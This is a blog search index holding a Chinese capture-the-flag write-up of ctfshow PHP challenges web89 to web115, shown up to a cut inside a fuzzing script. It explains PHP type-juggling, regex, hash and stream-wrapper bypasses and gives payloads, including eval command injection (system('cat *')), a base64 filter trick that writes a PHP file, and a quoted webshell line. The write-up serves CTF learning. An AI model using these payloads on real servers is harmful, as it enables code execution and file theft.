<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>EZphp</title>
      <link href="/2024/06/29/EZphp/"/>
      <url>/2024/06/29/EZphp/</url>
      
        <content type="html"><![CDATA[<h4 id="web89-数组绕过"><a href="#web89-数组绕过" class="headerlink" title="web89(数组绕过)"></a>web89(数组绕过)</h4><pre class="language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;num&#39;]))&#123;    $num &#x3D; $_GET[&#39;num&#39;];    if(preg_match(&quot;&#x2F;[0-9]&#x2F;&quot;, $num))&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num))&#123;        echo $flag;    &#125;&#125;</code></pre><p>分析上面的代码可以看出，正则匹配0-9，匹配到则返回true，直接die，但是由于preg_match()只能处理字符串，当传入的是数组时将会返回false,从而绕过死亡函数。</p><p> **intval()<strong>函数用于获取变量的整数值。</strong>intval()**函数通过使用指定的进制 base 转换（默认是十进制），返回变量var的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。也就是说，当给intval()函数传入一个非空的数组时，intval()函数将会返回1，结合我们preg_match()传入数组返回false的特性，这道题的payload就很清楚了。</p><p>Payload:<code>?num[]=1</code></p><h4 id="web90-intval"><a href="#web90-intval" class="headerlink" title="web90(intval)"></a>web90(intval)</h4><pre class="language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;num&#39;]))&#123;    $num &#x3D; $_GET[&#39;num&#39;];    if($num&#x3D;&#x3D;&#x3D;&quot;4476&quot;)&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)&#x3D;&#x3D;&#x3D;4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125;</code></pre><p>intval($var,$base)，其中var必填，base可选，这里base&#x3D;0,则表示根据var开始的数字决定使用的进制： 0x或0X开头使用十六进制，0开头使用八进制，否则使用十进制。</p><p>这里&#x3D;&#x3D;&#x3D;表示类型和数值必须相等，我们可以使用4476的八进制或十六进制绕过检测。</p><p>Paylod：</p><blockquote><p>num&#x3D;010574</p><p>num&#x3D;0x117c</p></blockquote><p>intval() 还有一个特性。输入的值如果是字符串，它返回的内容取决于第一个字符左侧的数字。如 intval(‘11a22’)&#x3D;11。</p><blockquote><p>num&#x3D;4476a</p><p>num&#x3D;+4476</p><p>…</p></blockquote><h4 id="web91-preg-match-m"><a href="#web91-preg-match-m" class="headerlink" title="web91(preg_match  &#x2F;m)"></a>web91(preg_match  &#x2F;m)</h4><pre class="language-php" data-language="php"><code class="language-php">$a&#x3D;$_GET[&#39;cmd&#39;];if(preg_match(&#39;&#x2F;^php$&#x2F;im&#39;, $a))&#123;    if(preg_match(&#39;&#x2F;^php$&#x2F;i&#39;, $a))&#123;        echo &#39;hacker&#39;;    &#125;    else&#123;        echo $flag;    &#125;&#125;else&#123;    echo &#39;nonononono&#39;;&#125; </code></pre><p><a href="https://blog.csdn.net/qq_46091464/article/details/108278486">Apache HTTPD 换行解析漏洞(CVE-2017-15715)与拓展</a></p><p>考察了preg_match的&#x2F;m模式  </p><p>im模式是可以匹配很多行  i模式只能匹配一行</p><p>%0a换行，相当于enter</p><p>Payload：</p><blockquote><p>cmd&#x3D;%0aphp</p><p>cmd&#x3D;php%0a1</p></blockquote><h4 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h4><p>和90很像不过第一个比较并不是强类型，所以不能使用简单的4476a或者4476.来绕过，其他都可以</p><h4 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h4><p>过滤了所有字母但是可以使用8进制</p><p>Payload: <code>num=010574</code></p><h4 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h4><pre class="language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;num&#39;]))&#123;    $num &#x3D; $_GET[&#39;num&#39;];    if($num&#x3D;&#x3D;&#x3D;&quot;4476&quot;)&#123;        die(&quot;no no no!&quot;);    &#125;    if(preg_match(&quot;&#x2F;[a-z]&#x2F;i&quot;, $num))&#123;        die(&quot;no no no!&quot;);    &#125;    if(!strpos($num, &quot;0&quot;))&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)&#x3D;&#x3D;&#x3D;4476)&#123;        echo $flag;    &#125;&#125;</code></pre><p>这段代码中的 if(!strpos($num, “0”)){} 行使用了 PHP 中的 strpos() 函数，它的作用是在字符串中查找特定子字符串第一次出现的位置。逐步解释这段代码的逻辑： 1.strpos($num, “0”)：这部分代码调用了 strpos() 函数，用于在 $num 变量中查找字符 “0” 第一次出现的位置。如果找到了，则返回该位置的索引值（索引值从0开始），如果没有找到，则返回 false。</p><p>所以开始不能有0，但是必须得有0，而且刚好第一个换成了强比较，所以可以使用4476.0</p><p>看其他wp是在前面加一个空格，也就是%20也可以使用%0a</p><h4 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h4><p>第一个改回去了，所以不能用4476.0其他Payload可以</p><h4 id="web96-绕过"><a href="#web96-绕过" class="headerlink" title="web96(.&#x2F;绕过)"></a>web96(.&#x2F;绕过)</h4><pre class="language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;u&#39;]))&#123;    if($_GET[&#39;u&#39;]&#x3D;&#x3D;&#39;flag.php&#39;)&#123;        die(&quot;no no no&quot;);    &#125;else&#123;        highlight_file($_GET[&#39;u&#39;]);    &#125;&#125;</code></pre><p>在Linux下.&#x2F;表示当前目录</p><p>Payload:<code>u=./flag.php</code></p><h4 id="web97-md5数组绕过"><a href="#web97-md5数组绕过" class="headerlink" title="web97(md5数组绕过)"></a>web97(md5数组绕过)</h4><pre class="language-php" data-language="php"><code class="language-php">if (isset($_POST[&#39;a&#39;]) and isset($_POST[&#39;b&#39;])) &#123;if ($_POST[&#39;a&#39;] !&#x3D; $_POST[&#39;b&#39;])if (md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;]))echo $flag; </code></pre><p>这一道题涉及到了强比较的md5类型，从代码我们可以得知，要求a、b两个值不一样但是需要这两个值得md5值一样，因此强比较类型，我们可以利用md5函数处理数组类型会返回false的特性，从而利用false&#x3D;false来绕过。</p><p><a href="https://www.freebuf.com/articles/web/321300.html">CTF知识点： 关于PHP运算符&#x3D;&#x3D;&#x3D; 与&#x3D;&#x3D;的总结</a></p><h4 id="web98-三元运算符和传址-引用"><a href="#web98-三元运算符和传址-引用" class="headerlink" title="web98(三元运算符和传址(引用) )"></a>web98(三元运算符和传址(引用) )</h4><pre class="language-php" data-language="php"><code class="language-php">include(&quot;flag.php&quot;);$_GET?$_GET&#x3D;&amp;$_POST:&#39;flag&#39;;$_GET[&#39;flag&#39;]&#x3D;&#x3D;&#39;flag&#39;?$_GET&#x3D;&amp;$_COOKIE:&#39;flag&#39;;$_GET[&#39;flag&#39;]&#x3D;&#x3D;&#39;flag&#39;?$_GET&#x3D;&amp;$_SERVER:&#39;flag&#39;;highlight_file($_GET[&#39;HTTP_FLAG&#39;]&#x3D;&#x3D;&#39;flag&#39;?$flag:__FILE__); </code></pre><p>看完一头雾水</p><p><a href="https://www.php.cn/php-notebook-172859.html">php函数的传值与传址(引用)详解</a></p><p>考点是PHP里面的三元运算符和传址(引用) 传址(引用)有点像c语言里面的地址 我们可以修改一下代码</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpinclude(&#39;flag.php&#39;);if($_GET)&#123;$_GET&#x3D;&amp;$_POST;&#x2F;&#x2F;只要有输入的get参数就将get方法改变为post方法(修改了get方法的地址)&#125;else&#123;&quot;flag&quot;;&#125; if($_GET[&#39;flag&#39;]&#x3D;&#x3D;&#39;flag&#39;)&#123;$_GET&#x3D;&amp;$_COOKIE;&#125;else&#123;&#39;flag&#39;;</code></pre><p>所以我们只需要 GET一个?1(因为GET传值调用了POST，所以无所谓) 加 POST一个HTTP_FLAG&#x3D;flag </p><h4 id="web99-in-array"><a href="#web99-in-array" class="headerlink" title="web99(in_array)"></a>web99(in_array)</h4><pre class="language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);$allow &#x3D; array();&#x2F;&#x2F;设置为数组for ($i&#x3D;36; $i &lt; 0x36d; $i++) &#123;array_push($allow, rand(1,$i));&#x2F;&#x2F;向数组里面插入随机数&#125; if(isset($_GET[&#39;n&#39;]) &amp;&amp; in_array($_GET[&#39;n&#39;], $allow))&#123;&#x2F;&#x2F;in_array()函数有漏洞 没有设置第三个参数 就可以形成自动转换eg:n&#x3D;1.php自动转换为1file_put_contents($_GET[&#39;n&#39;], $_POST[&#39;content&#39;]);&#x2F;&#x2F;写入1.php文件 内容是&lt;?php system($_POST[1]);?&gt;&#125;?&gt;</code></pre><p>array_push——往数组尾部插入元素<br>rand(1,$i)——随机生成1-877之间的数<br>&#x2F;&#x2F;所以array_push($allow, rand(1,$i))就是往数组中插入1-877之间的数字<br>in_array——搜索数组中是否存在指定的值:<br>in_array(search,array,type)<br>search为指定搜索的值<br>array为指定检索的数组<br>type为TRUE则 函数还会检查 search的类型是否和 array中的相同</p><p>综上，我们可以发现数组中的值是int，而在弱类型中当php字符串和int比较时,字符串会被转换成int，所以 字符串中数字后面的字符串会被忽略。题目中的in_array没有设置type,我们可以输入字符串5.php(此处数字随意，只要在rand(1,0x36d)之间即可)，转换之后也就是5</p><p>看到file_put_contents，可以使用php伪协议</p><h4 id="web100-is-numeric-运算符优先级"><a href="#web100-is-numeric-运算符优先级" class="headerlink" title="web100(is_numeric 运算符优先级)"></a>web100(is_numeric 运算符优先级)</h4><pre class="language-php" data-language="php"><code class="language-php"> &lt;?phphighlight_file(__FILE__);include(&quot;ctfshow.php&quot;);&#x2F;&#x2F;flag in class ctfshow;$ctfshow &#x3D; new ctfshow();$v1&#x3D;$_GET[&#39;v1&#39;];$v2&#x3D;$_GET[&#39;v2&#39;];$v3&#x3D;$_GET[&#39;v3&#39;];$v0&#x3D;is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123;    if(!preg_match(&quot;&#x2F;\;&#x2F;&quot;, $v2))&#123;  &#x2F;&#x2F; v2不能有;        if(preg_match(&quot;&#x2F;\;&#x2F;&quot;, $v3))&#123;  &#x2F;&#x2F; v3必须有;            eval(&quot;$v2(&#39;ctfshow&#39;)$v3&quot;);        &#125;    &#125;   &#125;?&gt;</code></pre><p>运算符优先级：**&amp;&amp; &gt; || &gt; &#x3D; &gt; and &gt; or**</p><p><strong>is_numeric()</strong> 函数用于检测变量是否为数字或数字字符串。</p><p>是数字和数字字符串则返回 TRUE，否则返回 FALSE</p><p><strong>var_dump()<strong>函数可以输出多个值。</strong>print_r</strong>也可以</p><p><strong>&#x3D;<strong>的运算符比</strong>and</strong>高</p><p>对于v0的值只需要看v1就可以v2,v3是干扰</p><p>所以v1输入数字</p><p>Payload:</p><blockquote><p>?v1&#x3D;11&amp;v2&#x3D;var_dump($ctfshow)&#x2F;<em>&amp;v3&#x3D;</em>&#x2F;;</p><p>?v1&#x3D;1&amp;v2&#x3D;system(‘ls’)&#x2F;<em>&amp;v3&#x3D;</em>&#x2F;;</p></blockquote><p>最后flag<code>0x2d</code>要转化为<code>-</code></p><h4 id="web101-反射类"><a href="#web101-反射类" class="headerlink" title="web101(反射类)"></a>web101(反射类)</h4><pre class="language-php" data-language="php"><code class="language-php">if($v0)&#123;    if(!preg_match(&quot;&#x2F;\\\\|\&#x2F;|\~|\&#96;|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\&#x3D;|\&#123;|\[|\&quot;|\&#39;|\,|\.|\;|\?|[0-9]&#x2F;&quot;, $v2))&#123;        if(!preg_match(&quot;&#x2F;\\\\|\&#x2F;|\~|\&#96;|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\&#x3D;|\&#123;|\[|\&quot;|\&#39;|\,|\.|\?|[0-9]&#x2F;&quot;, $v3))&#123;            eval(&quot;$v2(&#39;ctfshow&#39;)$v3&quot;);        &#125;    &#125;&#125;</code></pre><p>涉及到类，可以考虑使用 ReflectionClass 建立反射类。</p><p>new ReflectionClass($class) 可以获得类的反射对象（包含元数据信息）。</p><p>元数据对象（包含class的所有属性&#x2F;方法的元数据信息）。</p><p>payload：v1&#x3D;1&amp;v2&#x3D;echo new ReflectionClass&amp;v3&#x3D;;</p><p>flag中有些字符经过ACSII码变换，好像还少了一位，爆破即可</p><h4 id="web102-substr-call-user-func"><a href="#web102-substr-call-user-func" class="headerlink" title="web102(substr call_user_func)"></a>web102(substr call_user_func)</h4><pre class="language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);$v1 &#x3D; $_POST[&#39;v1&#39;];$v2 &#x3D; $_GET[&#39;v2&#39;];$v3 &#x3D; $_GET[&#39;v3&#39;];$v4 &#x3D; is_numeric($v2) and is_numeric($v3);if($v4)&#123;    $s &#x3D; substr($v2,2);  &#x2F;&#x2F; 截去了前两个字符    $str &#x3D; call_user_func($v1,$s);    echo $str;    file_put_contents($v3,$str);&#125;else&#123;    die(&#39;hacker&#39;);&#125;?&gt; </code></pre><p>**substr() **:函数返回字符串的一部分</p><p>**call_user_func()**：把第一个参数作为回调函数使用，后面的参数是这个函数的参数。返回调用函数的返回值。其实就是一种特殊的调用函数的方式。</p><p><strong>php5</strong>下is_numeric可识别16进制，如0x2e，然后调用hex2bin转成字符串写入木马，但题目环境没配好，是<strong>php7</strong>,所以要另换方法。<br>用伪协议写入，所以需要base64编码后转成16进制全是数字的字符串</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php $a&#x3D;&#39;&lt;?&#x3D;&#96;cat *&#96;;&#39;; $b&#x3D;base64_encode($a);&#x2F;&#x2F;$a&#x3D;PD89YGNhdCAqYDs&#x3D; $c&#x3D;bin2hex(&#39;PD89YGNhdCAqYDs&#39;); echo $c; ?&gt; 得到5044383959474e6864434171594473</code></pre><p><strong>PHP短标签</strong></p><?=(表达式)?><p>等价于<?php echo (表达式)?></p><p>Payload:</p><blockquote><p>GET:?v2&#x3D;115044383959474e6864434171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php</p><p>POST:v1&#x3D;hex2bin</p></blockquote><h4 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h4><pre class="language-php" data-language="php"><code class="language-php">if($v4)&#123;    $s &#x3D; substr($v2,2);    $str &#x3D; call_user_func($v1,$s);    echo $str;    if(!preg_match(&quot;&#x2F;.*p.*h.*p.*&#x2F;i&quot;,$str))&#123;        file_put_contents($v3,$str);    &#125;    else&#123;        die(&#39;Sorry&#39;);    &#125;&#125;</code></pre><p>加了个鸡肋的限制，因为本来就是用base64加密后的，所以没什么影响</p><h4 id="web104-sha1"><a href="#web104-sha1" class="headerlink" title="web104(sha1)"></a>web104(sha1)</h4><pre class="language-php" data-language="php"><code class="language-php">if(isset($_POST[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;    $v1 &#x3D; $_POST[&#39;v1&#39;];    $v2 &#x3D; $_GET[&#39;v2&#39;];    if(sha1($v1)&#x3D;&#x3D;sha1($v2))&#123;        echo $flag;    &#125;&#125;</code></pre><p>shal函数就是计算散列函数，可以理解为一个不可逆的加密函数，这题没啥过滤，直接传两个相同的参数就好了，构造payload</p><p>或者使用数组也可以绕过</p><p>值的判断是使用 <code>==</code>，所以找加密后 0e 开头的两个值也可以。</p><p>aaK1STfY -&gt; 0e76658526655756207688271159624026011393</p><p>aaO8zKZF -&gt; 0e89257456677279068558073954252716165668</p><h4 id="web105-php变量覆盖"><a href="#web105-php变量覆盖" class="headerlink" title="web105(php变量覆盖)"></a>web105(php变量覆盖)</h4><pre class="language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);include(&#39;flag.php&#39;);error_reporting(0);$error&#x3D;&#39;你还想要flag嘛？&#39;;$suces&#x3D;&#39;既然你想要那给你吧！&#39;;foreach($_GET as $key &#x3D;&gt; $value)&#123;    if($key&#x3D;&#x3D;&#x3D;&#39;error&#39;)&#123;        die(&quot;what are you doing?!&quot;);    &#125;    $$key&#x3D;$$value;&#125;foreach($_POST as $key &#x3D;&gt; $value)&#123;    if($value&#x3D;&#x3D;&#x3D;&#39;flag&#39;)&#123;        die(&quot;what are you doing?!&quot;);    &#125;    $$key&#x3D;$$value;&#125;if(!($_POST[&#39;flag&#39;]&#x3D;&#x3D;$flag))&#123;    die($error);&#125;echo &quot;your are good&quot;.$flag.&quot;\n&quot;;die($suces);?&gt;</code></pre><ul><li><p>本题考查变量覆盖和<code>die()</code>的知识</p></li><li><p><code>$$a = $$b</code>可以类似于，将$a的地址指向$b</p><p>所以无论$b怎么改变值，$a的值都会和$b一样</p></li><li><p><code>die()</code>函数虽然会终止程序，但同时也会输出括号内的终止提示信息</p></li><li><p>本题利用变量覆盖和<code>die()</code>函数的特性</p><ol><li>先对get的内容进行覆盖，且不能覆盖error，所以要覆盖suces，即?suces&#x3D;flag，此时suces&#x3D;&gt;flag的地址</li><li>再对post的内容进行覆盖，且不能将flag直接覆盖，所以只能error&#x3D;suces，此时error&#x3D;&gt;flag的地址</li><li>此时无论进入哪个<code>die()</code>函数，都可以输出<code>$flag</code>的值</li></ol></li></ul><p>Payload:</p><blockquote><p>GET:?suces&#x3D;flag</p><p>POST:error&#x3D;suces</p></blockquote><h4 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h4><pre class="language-php" data-language="php"><code class="language-php">if(sha1($v1)&#x3D;&#x3D;sha1($v2) &amp;&amp; $v1!&#x3D;$v2)&#123;        echo $flag;    &#125; </code></pre><p>加了限制，Payload同104</p><h4 id="web107-parse-str"><a href="#web107-parse-str" class="headerlink" title="web107(parse_str)"></a>web107(parse_str)</h4><pre class="language-php" data-language="php"><code class="language-php">if(isset($_POST[&#39;v1&#39;]))&#123;    $v1 &#x3D; $_POST[&#39;v1&#39;];    $v3 &#x3D; $_GET[&#39;v3&#39;];       parse_str($v1,$v2);       if($v2[&#39;flag&#39;]&#x3D;&#x3D;md5($v3))&#123;           echo $flag;       &#125;&#125; </code></pre><p><strong>parse_str</strong>($v1,$v2); &#x2F;&#x2F;把v1的值相应的换成键值对再存入v2(数组)<br>v1&#x3D;flag&#x3D;114&amp;index&#x3D;300的话，<br>v2就变成一个数组，内容为flag–&gt;114      index–&gt;300（分为这两个键值对）</p><p>所以只需要让传入的flag md5值与v3一样就可</p><p>Payload:</p><blockquote><p>POST:v1&#x3D;flag&#x3D;47bce5c74f589f4867dbd57e9ca9f808</p><p>GET:?v3&#x3D;aaa</p></blockquote><h4 id="we108-ereg-NULL截断漏洞"><a href="#we108-ereg-NULL截断漏洞" class="headerlink" title="we108(ereg NULL截断漏洞)"></a>we108(ereg NULL截断漏洞)</h4><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#39;c&#39;])&#x3D;&#x3D;&#x3D;FALSE)  &#123;    die(&#39;error&#39;);&#125;&#x2F;&#x2F;只有36d的人才能看到flagif(intval(strrev($_GET[&#39;c&#39;]))&#x3D;&#x3D;0x36d)&#123;    echo $flag;&#125; </code></pre><p>ereg (“^[a-zA-Z]+$”, $_GET[‘c’])&#x3D;&#x3D;&#x3D;FALSE</p><p>ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字 母的字符是大小写敏感的。</p><p>结合ereg()函数用法，搜索不到指定字符串就会返回FALSE</p><p>所以要让c中有字母，但不能出现其他东西</p><p>ereg 函数存在 NULL 截断漏洞，可以绕过正则过滤，使用 %00 截断。</p><p>0x36d，转十进制是877。</p><p>Payload:<code>c=a%00778</code></p><h4 id="web109-php内置类的使用"><a href="#web109-php内置类的使用" class="headerlink" title="web109(php内置类的使用)"></a>web109(php内置类的使用)</h4><pre class="language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);error_reporting(0);if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;    $v1 &#x3D; $_GET[&#39;v1&#39;];    $v2 &#x3D; $_GET[&#39;v2&#39;];    if(preg_match(&#39;&#x2F;[a-zA-Z]+&#x2F;&#39;, $v1) &amp;&amp; preg_match(&#39;&#x2F;[a-zA-Z]+&#x2F;&#39;, $v2))&#123;            eval(&quot;echo new $v1($v2());&quot;);    &#125;&#125;?&gt; </code></pre><p>看到echo new尝试反射类</p><p>Payload：</p><blockquote><p>?v1&#x3D;Reflectionclass&amp;v2&#x3D;system(‘tac fl36dg.txt’)</p><p>?v1&#x3D;Exception&amp;v2&#x3D;system(‘cat *’)  异常处理</p><p>?v1&#x3D;class{ public function __construct(){ system(‘ls’); } };&amp;v2&#x3D;a  用匿名类绕过 </p></blockquote><p>v1&#x3D;内置类&amp;v2&#x3D;system(‘ls’)即可 php中会先执行ls命令然后把结果作为参数再执行但ls的结果已经被输出了</p><h4 id="web110-FilesystemIterator-class"><a href="#web110-FilesystemIterator-class" class="headerlink" title="web110(FilesystemIterator class)"></a>web110(FilesystemIterator class)</h4><pre class="language-php" data-language="php"><code class="language-php">$v1 &#x3D; $_GET[&#39;v1&#39;];    $v2 &#x3D; $_GET[&#39;v2&#39;];    if(preg_match(&#39;&#x2F;\~|\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]&#x2F;&#39;, $v1))&#123;            die(&quot;error v1&quot;);    &#125;    if(preg_match(&#39;&#x2F;\~|\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]&#x2F;&#39;, $v2))&#123;            die(&quot;error v2&quot;);    &#125;    eval(&quot;echo new $v1($v2());&quot;); </code></pre><p>[The FilesystemIterator class](<a href="https://www.php.net/manual/zh/class.filesystemiterator.php">PHP: FilesystemIterator - Manual</a>)</p><p>php内置类 利用 FilesystemIterator 获取指定目录下的所有文件</p><p>Payload:<code>?v1=FilesystemIterator&amp;v2=getcwd</code></p><h4 id="web111-GLOBALS"><a href="#web111-GLOBALS" class="headerlink" title="web111(GLOBALS)"></a>web111(GLOBALS)</h4><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpinclude(&quot;flag.php&quot;);function getFlag(&amp;$v1,&amp;$v2)&#123;    eval(&quot;$$v1 &#x3D; &amp;$$v2;&quot;);    var_dump($$v1);&#125;if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;    $v1 &#x3D; $_GET[&#39;v1&#39;];    $v2 &#x3D; $_GET[&#39;v2&#39;];    if(preg_match(&#39;&#x2F;\~| |\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]|\&lt;|\&gt;&#x2F;&#39;, $v1))&#123;            die(&quot;error v1&quot;);    &#125;    if(preg_match(&#39;&#x2F;\~| |\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]|\&lt;|\&gt;&#x2F;&#39;, $v2))&#123;            die(&quot;error v2&quot;);    &#125;        if(preg_match(&#39;&#x2F;ctfshow&#x2F;&#39;, $v1))&#123;            getFlag($v1,$v2);    &#125;&#125; </code></pre><p>注意 PHP 的函数具有词法作用域</p><p>在函数内部无法调用外部的变量，除非进行传参。这道题无非注意以下几点：</p><ol><li>我们最终要得到 $flag 的值，就需要 var_dump($$v1) 中的 $v1 为 flag，即 $v2 要为 flag，这样 $$v2 就为 $flag，&amp;$$v2 就为 $flag 对应的值</li><li>URL 传参时 $v2 不能直接传为 flag，否则 $flag 会因“函数内部无法调用外部变量”的限制而导致其返回 null</li><li>要想跨过词法作用域的限制，我们可以用 GLOBALS 常量数组，其中包含了 $flag 键值对，就可以将 $flag 的值赋给 $$v1</li></ol><p>Payload：<code>?v1=ctfshow&amp;v2=GLOBALS</code></p><h4 id="web112-is-file"><a href="#web112-is-file" class="headerlink" title="web112(is_file)"></a>web112(is_file)</h4><pre class="language-php" data-language="php"><code class="language-php">function filter($file)&#123;    if(preg_match(&#39;&#x2F;\.\.\&#x2F;|http|https|data|input|rot13|base64|string&#x2F;i&#39;,$file))&#123;        die(&quot;hacker!&quot;);    &#125;else&#123;        return $file;    &#125;&#125;$file&#x3D;$_GET[&#39;file&#39;];if(! is_file($file))&#123;    highlight_file(filter($file));&#125;else&#123;    echo &quot;hacker!&quot;;&#125; </code></pre><p>要求传入的file不是文件，但还能highlight_file，这就要说明is_file和highlight_file对于文件的判断：is_file认为伪协议不是文件，highlight_file认为伪协议是文件，所以这里传入filter伪协议即可。</p><p>Payload:</p><blockquote><p>php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php<br>php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;flag.php<br>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-encode&#x2F;resource&#x3D;flag.php<br>compress.zlib:&#x2F;&#x2F;flag.php</p></blockquote><p><a href="https://www.novel.tools/decode/UCS-2BE">UCS-2BE Text Decoder</a></p><h4 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h4><pre class="language-php" data-language="php"><code class="language-php">function filter($file)&#123;    if(preg_match(&#39;&#x2F;filter|\.\.\&#x2F;|http|https|data|data|rot13|base64|string&#x2F;i&#39;,$file))&#123;        die(&#39;hacker!&#39;);    &#125;else&#123;        return $file;    &#125;&#125;$file&#x3D;$_GET[&#39;file&#39;];if(! is_file($file))&#123;    highlight_file(filter($file));&#125;else&#123;    echo &quot;hacker!&quot;;&#125;</code></pre><p>1.利用函数所能处理的长度限制进行目录溢出： 原理：&#x2F;proc&#x2F;self&#x2F;root代表根目录，进行目录溢出，超过is_file能处理的最大长度就不认为是个文件了。 payload: <code>file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/ self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se lf/root/proc/self/root/var/www/html/flag.php</code></p><p>2.利用php中zip伪协议 用法[源于php官方提供的一些例子]： compress.zlib:&#x2F;&#x2F;file.gz compress.zlib:&#x2F;&#x2F;file.bz2 payload: <code>file=compress.zlib://flag.php</code></p><h4 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h4><pre class="language-php" data-language="php"><code class="language-php">function filter($file)&#123;    if(preg_match(&#39;&#x2F;compress|root|zip|convert|\.\.\&#x2F;|http|https|data|data|rot13|base64|string&#x2F;i&#39;,$file))&#123;        die(&#39;hacker!&#39;);    &#125;else&#123;        return $file;    &#125;&#125;$file&#x3D;$_GET[&#39;file&#39;];echo &quot;师傅们居然tql都是非预期 哼！&quot;;if(! is_file($file))&#123;    highlight_file(filter($file));&#125;else&#123;    echo &quot;hacker!&quot;;&#125;</code></pre><p>把filter放出来了，直接读</p><h4 id="web115-f绕过is-numberic-trim"><a href="#web115-f绕过is-numberic-trim" class="headerlink" title="web115(\f绕过is_numberic()+trim())"></a>web115(\f绕过is_numberic()+trim())</h4><pre class="language-php" data-language="php"><code class="language-php">function filter($num)&#123;    $num&#x3D;str_replace(&quot;0x&quot;,&quot;1&quot;,$num);    $num&#x3D;str_replace(&quot;0&quot;,&quot;1&quot;,$num);    $num&#x3D;str_replace(&quot;.&quot;,&quot;1&quot;,$num);    $num&#x3D;str_replace(&quot;e&quot;,&quot;1&quot;,$num);    $num&#x3D;str_replace(&quot;+&quot;,&quot;1&quot;,$num);    return $num;&#125;$num&#x3D;$_GET[&#39;num&#39;];if(is_numeric($num) and $num!&#x3D;&#x3D;&#39;36&#39; and trim($num)!&#x3D;&#x3D;&#39;36&#39; and filter($num)&#x3D;&#x3D;&#39;36&#39;)&#123;    if($num&#x3D;&#x3D;&#39;36&#39;)&#123;        echo $flag;    &#125;else&#123;        echo &quot;hacker!!&quot;;    &#125;&#125;else&#123;    echo &quot;hacker!!!&quot;;&#125;</code></pre><p><strong>trim()</strong> 函数移除字符串两侧的空白字符或其他预定义字符。</p><p>一般是用来去除字符串首尾处的空白字符（或者其他字符），一般在用在服务端对接收的用户数据进行处理，以免把用户误输入的空格存储到数据库，下次对比数据时候出错。</p><p>filter让我们没法转进制绕过，这道题的关键在于如何绕过trim，推测需要特殊字符，所以我们写个脚本fuzz一下：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpfunction filter($num)&#123;    $num&#x3D;str_replace(&quot;0x&quot;,&quot;1&quot;,$num);    $num&#x3D;str_replace(&quot;0&quot;,&quot;1&quot;,$num);    $num&#x3D;str_replace(&quot;.&quot;,&quot;1&quot;,$num);    $num&#x3D;str_replace(&quot;e&quot;,&quot;1&quot;,$num);    $num&#x3D;str_replace(&quot;+&quot;,&quot;1&quot;,$num);    return $num;&#125;for($i&#x3D;0;$i&lt;129;$i++)&#123;    $num&#x3D;chr($i).&#39;36&#39;;    if(is_numeric($num) and $num!&#x3D;&#x3D;&#39;36&#39; and trim($num)!&#x3D;&#x3D;&#39;36&#39; and filter($num)&#x3D;&#x3D;&#39;36&#39;)&#123;        echo urlencode(chr($i));    &#125; 